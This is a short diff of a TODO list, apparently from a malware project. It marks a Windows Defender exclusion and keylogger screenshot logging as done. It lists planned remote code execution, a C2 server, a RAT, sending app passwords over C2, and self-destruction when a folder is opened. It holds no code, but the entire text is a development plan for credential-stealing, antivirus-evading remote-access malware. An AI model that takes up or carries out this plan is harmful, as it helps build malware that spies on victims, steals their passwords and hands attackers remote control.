@@ -1,7 +1,9 @@
 # TODO
-# - Windows defender exclude map for scan
+# - DONE Windows defender exclude map for scan
 # - RCE with dashboard 
-# - JSON config
+# - DONE JSON config
 # - C2 server
 # - RAT
 # - DONE fun to add: in keylog also log when taken a screenshot 
+# - app password over C2 transmit
+# - on read/opening folder self destruct
